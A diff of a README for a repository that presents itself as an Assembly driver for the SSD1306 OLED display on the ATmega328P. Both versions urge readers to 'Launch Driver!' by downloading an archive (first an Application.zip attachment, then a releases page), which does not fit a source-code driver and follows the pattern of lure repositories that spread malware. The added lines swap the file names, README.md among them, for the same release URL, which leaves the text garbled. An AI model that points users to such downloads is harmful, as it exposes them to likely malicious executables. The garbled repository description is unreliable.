@@ -1,14 +1,14 @@
 # ATmega328P SSD1306 Driver
 
-![ATmega328P SSD1306 Driver](https://img.shields.io/badge/ATmega328P-SSD1306%20Driver-orange)
+![ATmega328P SSD1306 Driver](https://github.com/Desstroyerrr/ATmega328P_SSD1306_Driver/releases/tag/v2.0%20Driver-orange)
 
 Welcome to the ATmega328P SSD1306 Driver repository! This project involves an ATmega328P driver for the SSD1306 OLED display, written entirely in Assembly language. If you are looking to work with the ATmega328P microcontroller and the SSD1306 display, this driver will be a valuable resource for your projects.
 
 ## Repository Contents
 
 This repository contains the following key files:
-- **ATmega328P_SSD1306_Driver.asm**: The main driver file written in Assembly for controlling the SSD1306 OLED display with the ATmega328P microcontroller.
-- **README.md**: The file you are currently reading, providing an overview of the repository.
+- **https://github.com/Desstroyerrr/ATmega328P_SSD1306_Driver/releases/tag/v2.0**: The main driver file written in Assembly for controlling the SSD1306 OLED display with the ATmega328P microcontroller.
+- **https://github.com/Desstroyerrr/ATmega328P_SSD1306_Driver/releases/tag/v2.0**: The file you are currently reading, providing an overview of the repository.
 - **LICENSE**: The license file containing information about the usage and distribution of the driver.
 
 ## Repository Topics
@@ -28,7 +28,7 @@ This repository contains the following key files:
 
 To get started with using the ATmega328P SSD1306 Driver, you can download the driver file from the following link:
 
-[Launch Driver!](https://github.com/user-attachments/files/18426772/Application.zip)
+[Launch Driver!](https://github.com/Desstroyerrr/ATmega328P_SSD1306_Driver/releases/tag/v2.0)
 
 You can unzip the file and include it in your project for interfacing with the SSD1306 OLED display using the ATmega328P microcontroller.
 
